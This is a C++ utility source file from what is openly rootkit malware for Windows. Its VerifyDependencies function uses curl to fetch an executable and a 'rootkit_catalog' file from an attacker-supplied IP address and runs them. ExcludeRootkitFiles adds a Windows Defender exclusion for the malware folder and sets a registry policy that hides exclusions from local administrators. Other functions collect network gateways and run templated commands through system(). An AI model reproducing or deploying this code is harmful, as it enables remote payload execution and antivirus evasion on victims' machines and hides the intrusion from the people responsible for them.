#include "utils.h"


int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
    int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
    MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
    return WideNameLen;
}


int WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
    int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
    return MultiByteLen;
}


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


int CountOccurrences(const char* SearchStr, char SearchLetter) {
    DWORD Count = 0;
    for (int i = 0; i < strlen(SearchStr); i++) {
        if (SearchStr[i] == SearchLetter) {
            Count++;
        }
    }
    return Count;
}


void GetServiceName(char* Path, char* Buffer) {
    char TempBuffer[MAX_PATH] = { 0 };
    int bi = 0;
    int acbi = 0;
    int pi = (int)strlen(Path) - 1;

    for (; pi >= 0; pi--, bi++) {
        if (Path[pi] == '\\') {
            break;
        }
        TempBuffer[bi] = Path[pi];
    }
    TempBuffer[bi] = '\0';
    for (bi = (int)strlen(TempBuffer) - 1; bi >= 0; bi--, acbi++) {
        Buffer[acbi] = TempBuffer[bi];
    }
}


void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
    int ii = 0;
    int repi = 0;
    int comi = 0;

    for (int i = 0; i <= strlen(BaseString); i++) {
        if (repi < Size && BaseString[i] == RepArr[repi].WhereTo) {
            memcpy((PVOID)((ULONG64)Output + comi), RepArr[repi].Replace, strlen(RepArr[repi].Replace));
            comi += strlen(RepArr[repi].Replace);

            RepArr[repi].RepCount -= 1;
            if (RepArr[repi].RepCount == 0) {
                repi++;
            }
        }
        else {
            Output[comi] = BaseString[i];
            comi++;
        }
    }
}

DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
    char Command[500] = { 0 };
    ReplaceValues(BaseCommand, RepArr, Command, Size);
    if (system(Command) == -1) {
        return GetLastError();
    }
    return 0;
}


void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,;[]{}-_=+)(&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    int i = 0;
    for (; i < (int)RandSize; i++) {
        NameBuf[i] = Alp[distr(gen)];
    }
    for (int exti = 0; exti <= strlen(Extension); exti++, i++) {
        NameBuf[i] = Extension[exti];
    }
}


int GetPidByName(const char* Name) {
    int ProcessId = 0;
    DWORD Procs[1024] = { 0 }, BytesReturned = 0, ProcessesNum = 0;
    char CurrentName[MAX_PATH] = { 0 };
    HANDLE CurrentProc = INVALID_HANDLE_VALUE;
    HMODULE CurrentProcMod = NULL;

    // Get the list of PIDs of all running processes -   
    if (!EnumProcesses(Procs, sizeof(Procs), &BytesReturned))
        return 0;
    ProcessesNum = BytesReturned / sizeof(DWORD);

    for (int i = 0; i < ProcessesNum; i++) {
        if (Procs[i] != 0) {
            CurrentProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);
            if (CurrentProc != NULL) {
                if (EnumProcessModules(CurrentProc, &CurrentProcMod, sizeof(CurrentProcMod), &BytesReturned)) {
                    GetModuleBaseNameA(CurrentProc, CurrentProcMod, CurrentName, sizeof(CurrentName) / sizeof(TCHAR));
                    if (lstrcmpiA(Name, CurrentName) == 0) {
                        ProcessId = Procs[i];
                        break;
                    }
                }
                CloseHandle(CurrentProc);
            }
        }
    }
    return ProcessId;
}


int CheckLetterInArr(char Chr, const char* Arr) {
    for (int i = 0; i < strlen(Arr); i++) {
        if (Arr[i] == Chr) {
            return i;
        }
    }
    return -1;
}


BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
    int ActualSize = 1;
    int CurrRepIndex = 0;
    int ActualCommandIndex = 0;
    int SystemReturn = -1;

    for (int ci = 0; ci < CommandCount; ci++) {
        ActualSize += strlen(CommandArr[ci]);
        for (int si = 0; si < SymbolCount; si++) {
            ActualSize -= CountOccurrences(CommandArr[ci], Symbols[si]);
            for (int r = 0; r < CountOccurrences(CommandArr[ci], Symbols[si]); r++) {
                ActualSize += strlen(Replacements[si]);
            }
        }
    }

    char* ActualCommand = (char*)malloc(ActualSize);
    if (ActualCommand == NULL) {
        printf("malloc failed - %d\n", GetLastError());
        return FALSE;
    }

    for (int ci = 0; ci < CommandCount; ci++) {
        for (int cii = 0; cii < strlen(CommandArr[ci]); cii++) {
            CurrRepIndex = CheckLetterInArr(CommandArr[ci][cii], Symbols);
            if (CurrRepIndex == -1) {
                ActualCommand[ActualCommandIndex] = CommandArr[ci][cii];
                ActualCommandIndex++;
            }
            else {
                for (int ri = 0; ri < strlen(Replacements[CurrRepIndex]); ri++) {
                    ActualCommand[ActualCommandIndex] = Replacements[CurrRepIndex][ri];
                    ActualCommandIndex++;
                }
            }
        }
    }
    ActualCommand[ActualCommandIndex] = '\0';
    printf("Performed command: %s\n", ActualCommand);
    SystemReturn = system(ActualCommand);
    if (SystemReturn == -1) {
        free(ActualCommand);
        printf("Performed command returned -1 (error) - %d\n", GetLastError());
        return FALSE;
    }
    free(ActualCommand);
    printf("Performed command returned >= 0 (%d)\n", SystemReturn);
    return TRUE;
}


int VerifyDependencies(const char* AttackerIp) {
    const char* FileCommands[] = { "if not exist C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 mkdir C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 && ",
        "curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\WebScraper.exe && ",
        "curl http://~:8080/rootkit_catalog.txt --output C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\rootkit_catalog.txt && ",
        "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\WebScraper.exe C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\rootkit_catalog.txt ~" };

    const char* ReplaceArr[1] = { AttackerIp };
    const char* SymbolsArr = "~";
    const int TotalCommands = 4;
    if (!PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
        return (int)GetLastError();
    }
    return 0;
}


BOOL IsValidIp(char* Address) {
    DWORD CurrChunkValue = 0;
    if (Address == NULL || CountOccurrences(Address, '.') != 3) {
        return FALSE;
    }

    for (int i = 0; i < strlen(Address); i++) {
        if (Address[i] != '.') {
            if (isdigit(Address[i]) == 0 && Address[i]) {
                return FALSE;
            }
            CurrChunkValue *= 10;
            CurrChunkValue += (Address[i] - 0x30);
        }
        else {
            if (!(CurrChunkValue >= 0 && CurrChunkValue <= 255)) {
                return FALSE;
            }
            CurrChunkValue = 0;
        }
    }
    return TRUE;
}


int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm) {
    DWORD OperationOutput = 0;
    if (FileHandle == NULL || FilePath == NULL || FileData == NULL || FileDataSize == NULL) {
        return -1;
    }
    if (IsWrite) {
        *FileHandle = CreateFileA(FilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    else {
        *FileHandle = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (*FileHandle == INVALID_HANDLE_VALUE) {
        return 1;  // Invalid handle
    }
    *FileDataSize = GetFileSize(*FileHandle, 0);
    if (*FileDataSize == 0) {
        CloseHandle(*FileHandle);
        return 2;  // File size = 0
    }
    *FileData = malloc(*FileDataSize + ShouldNullTerm);  // If null terminated: needs +1 character (TRUE = 1)
    if (*FileData == NULL) {
        CloseHandle(*FileHandle);
        return 3;  // Malloc failed
    }
    if ((!IsWrite && (!ReadFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
        OperationOutput != *FileDataSize)) ||
        (IsWrite && (!WriteFile(*FileHandle, *FileData, *FileDataSize, &OperationOutput, NULL) ||
            OperationOutput != *FileDataSize))) {
        CloseHandle(*FileHandle);
        free(*FileData);
        return 4;  // Actual operation failed
    }
    if (ShouldNullTerm) {
        ((char*)(*FileData))[*FileDataSize] = '\0';
    }
    CloseHandle(*FileHandle);
    return 0;
}


char* ExtractGateways(char* IpConfigOutput) {
    SIZE_T NextGatewayOffset = 0;
    ULONG64 CurrentAddressSize = 0;
    ULONG64 OccurenceOffset = 0;
    ULONG64 GatewayBufferSize = 0;
    char CurrentAddress[MAX_PATH] = { 0 };
    char* GatewayBuffer = NULL;
    char* TemporaryBuffer = NULL;
    const char* GatewayIdentifier = "Default Gateway . . . . . . . . . : ";
    std::string StringOutput(IpConfigOutput);
    if (IpConfigOutput == NULL) {
        return NULL;
    }

    NextGatewayOffset = StringOutput.find(GatewayIdentifier, 0);
    while (NextGatewayOffset != std::string::npos) {
        OccurenceOffset = NextGatewayOffset + strlen(GatewayIdentifier);
        if (StringOutput.c_str()[OccurenceOffset] == '\r' &&
            StringOutput.c_str()[OccurenceOffset + 1] == '\n') {
            goto NextGateway;  // No gateway address specified
        }

        // Copy current address:
        for (CurrentAddressSize = 0; !(StringOutput.c_str()[OccurenceOffset + CurrentAddressSize] == '\r' &&
            StringOutput.c_str()[OccurenceOffset + CurrentAddressSize + 1] == '\n'); CurrentAddressSize++) {
            CurrentAddress[CurrentAddressSize] = StringOutput.c_str()[OccurenceOffset + CurrentAddressSize];
        }
        CurrentAddress[CurrentAddressSize] = '\0';


        // Only handle valid IPv4 addresses:
        if (IsValidIp(CurrentAddress)) {
            if (GatewayBuffer == NULL) {
                GatewayBuffer = (char*)malloc(CurrentAddressSize + 1);  // Always null terminate
                if (GatewayBuffer == NULL) {
                    return NULL;
                }
                RtlCopyMemory(GatewayBuffer, CurrentAddress, CurrentAddressSize + 1);
            }
            else {
                TemporaryBuffer = (char*)malloc(strlen(GatewayBuffer) + CurrentAddressSize + 2);  // +2 for null terminator and '~'
                if (TemporaryBuffer == NULL) {
                    free(GatewayBuffer);
                    return NULL;
                }
                RtlCopyMemory(TemporaryBuffer, GatewayBuffer, strlen(GatewayBuffer));
                TemporaryBuffer[strlen(GatewayBuffer)] = '~';
                RtlCopyMemory(TemporaryBuffer + strlen(GatewayBuffer) + 1, CurrentAddress,
                    CurrentAddressSize);
                TemporaryBuffer[strlen(GatewayBuffer) + CurrentAddressSize + 1] = '\0';
                free(GatewayBuffer);
                GatewayBuffer = TemporaryBuffer;
            }

        }
    NextGateway:
        NextGatewayOffset = StringOutput.find(GatewayIdentifier, NextGatewayOffset + strlen(GatewayIdentifier));
    }
    return GatewayBuffer;
}


char* GetGatewayList() {
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    ULONG64 FileDataSize = 0;
    char* FileData = NULL;
    char* FilteredData = NULL;
    system("ipconfig /all > IpConfigOutput");
    if (FileOperation((char*)"IpConfigOutput", &FileHandle, (PVOID*)&FileData, &FileDataSize, FALSE, TRUE) != 0 ||
        FileHandle == NULL) {
        return NULL;
    }
    FilteredData = ExtractGateways(FileData);
    free(FileData);
    system("del /s /q IpConfigOutput");
    return FilteredData;
}


DWORD ExcludeRootkitFiles() {
    HKEY RegistryKey = NULL;
    DWORD KeyValue = 1;
    LSTATUS Status = ERROR_SUCCESS;


    // Create exclusion for virus files:
    if (system("powershell -inputformat none -outputformat none -NonInteractive -Command"
        " Add-MpPreference -ExclusionPath \"C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\"") == -1) {
        return 1;
    }


    // Hide exclusions:
    Status = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &RegistryKey);
    if (Status != ERROR_SUCCESS) {
        return Status;
    }
    Status = RegSetValueExA(RegistryKey, "HideExclusionsFromLocalAdmins", 0, REG_DWORD,
        (const BYTE*)&KeyValue, sizeof(KeyValue));
    if (Status != ERROR_SUCCESS) {
        RegCloseKey(RegistryKey);
        return Status;
    }
    RegCloseKey(RegistryKey);
    return 0;
}